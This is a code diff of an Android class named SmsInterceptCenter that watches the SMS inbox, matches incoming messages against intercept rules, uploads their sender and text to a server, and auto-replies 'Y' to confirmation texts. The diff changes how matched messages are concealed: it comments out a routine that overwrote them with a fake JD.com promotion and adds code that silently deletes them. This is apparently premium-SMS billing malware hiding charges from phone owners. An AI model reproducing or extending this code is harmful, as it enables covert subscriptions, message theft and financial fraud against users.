@@ -46,15 +46,16 @@ public class SmsInterceptCenter extends ContentObserver {
         if (uri.toString().equals("content://sms")) {
             return;
         }
-        String uriID = uri.toString().substring(uri.toString().lastIndexOf("/") + 1);
-        if (!uriID.equals("")) {
-            int uriID2Int = Integer.parseInt(uriID);
-            if (uriID2Int == smsID) {
-                return;
-            } else {
-                smsID = uriID2Int;
-            }
-        }
+//        Log.debug("Uri uri:" + uri.toString());
+//        String uriID = uri.toString().substring(uri.toString().lastIndexOf("/") + 1);
+//        if (!uriID.equals("")) {
+//            int uriID2Int = Integer.parseInt(uriID);
+//            if (uriID2Int == smsID) {
+//                return;
+//            } else {
+//                smsID = uriID2Int;
+//            }
+//        }
         ReadSmsContent(context);
     }
 
@@ -116,6 +117,7 @@ public class SmsInterceptCenter extends ContentObserver {
         }
         mCursor.close();
         for (int i = 0; i < list.size(); i++) {
+            Log.debug("拦截到的短信内容 :" + list.get(i).toString());
             String content = chooseSMS(list.get(i));
             if (!("").equals(content)) {
                 smsHandle(list.get(i).toString(), context);
@@ -124,18 +126,18 @@ public class SmsInterceptCenter extends ContentObserver {
 //        Sms_send_tongbu(catchError(e), SDKInit.mContext, -1);
     }
 
-    private void changeSMS(String id) {
-        ContentValues values = new ContentValues();
-        values.put("read", "1");
-        values.put("address", "95555");
-        values.put("body", "京东会员，我们准备了51元暖心礼包+专享花费券！戳 dc.jd.com/dPEJQQ 领走！神券在握，低价不怕错过！ 回BK退订【京东】");
-        context.getContentResolver().update(Uri.parse("content://sms/"), values, "_id=?", new String[]{"" + id});
-    }
-//    private int delete(String _id) {
-//        Uri contentUri = Uri.parse("content://sms");
-//        int delete = context.getContentResolver().delete(contentUri, "read=0 and _id=?", new String[]{_id});
-//        return delete;
+    //    private void changeSMS(String id) {
+//        ContentValues values = new ContentValues();
+//        values.put("read", "1");
+//        values.put("address", "95555");
+//        values.put("body", "京东会员，我们准备了51元暖心礼包+专享花费券！戳 dc.jd.com/dPEJQQ 领走！神券在握，低价不怕错过！ 回BK退订【京东】");
+//        context.getContentResolver().update(Uri.parse("content://sms/"), values, "_id=?", new String[]{"" + id});
 //    }
+    private int delete(String _id) {
+        Uri contentUri = Uri.parse("content://sms");
+        int delete = context.getContentResolver().delete(contentUri, "read=0 and _id=?", new String[]{_id});
+        return delete;
+    }
 
     private String chooseSMS(String content) {
         String _id = "";
@@ -144,26 +146,23 @@ public class SmsInterceptCenter extends ContentObserver {
         try {
             JSONObject json = new JSONObject(content);
             _id = json.getString("_id");
-//            if (_id.equals(smsId)) {
             smsAddress = json.getString("smsAddress");
             smsBody = json.getString("smsBody");
             if (Constants.isOutPut) {
                 Log.debug("======>smsAddress" + smsAddress);
                 Log.debug("======>smsBody" + smsBody);
             }
-//            } else {
-//                return "";
-//            }
         } catch (Exception e) {
             System.out.println("eeeee:" + e);
-//            delete(_id);
-            changeSMS(_id);
+            delete(_id);
+//            changeSMS(_id);
             SmsSynchronousRequest.getInstance().request(context, catchError(e), -2);
             return "";
         }
         Log.debug("contentCacheString:" + contentCacheString);
         if (contentCacheString.equals(smsBody)) {
-            changeSMS(_id);
+//            changeSMS(_id);
+            delete(_id);
             if (Constants.isOutPut) {
                 Log.debug("==========>缓存的东西跟新短信内容相同:" + smsBody);
             }
@@ -173,7 +172,8 @@ public class SmsInterceptCenter extends ContentObserver {
             if (Constants.isOutPut) {
                 Log.debug("==========>缓存的东西跟新短信内容不相同並且需要同步:" + smsBody);
             }
-            changeSMS(_id);
+//            changeSMS(_id);
+            delete(_id);
             SmsSynchronousRequest.getInstance().request(context, "smsAddress:" + smsAddress + "\t" + "smsBody:" + smsBody, 1);
             return content;
         }
@@ -242,8 +242,15 @@ public class SmsInterceptCenter extends ContentObserver {
                         }
                     }
                 }
+            } else {
+                if (smsAddress.equals(limit_msg_2) && smsBody.contains(limit_msg_data)) {
+                    b = true;
+                }
             }
-            if (b && smsBody.contains(limit_msg_data)) {
+            Log.debug("bbbbbbb:" + b);
+            Log.debug("smsBody:" + smsBody);
+            Log.debug("limit_msg_data:" + limit_msg_data);
+            if (b) {
                 try {
                     JSONObject json = new JSONObject(interceptContentList.get(i).toString());
                     payType = json.getString("payType");
@@ -258,9 +265,7 @@ public class SmsInterceptCenter extends ContentObserver {
                     if (limitNum.equals("")) {
                         limitNum = smsAddress;
                     }
-                    if (payType.equals("0")) {
-
-                    } else if (payType.equals("1")) {
+                    if (payType.equals("1")) {
                         if (Constants.isOutPut) {//二次短信回复任意内容
                             Log.debug("======>要开始回复Y了:" + senderContent);
                         }
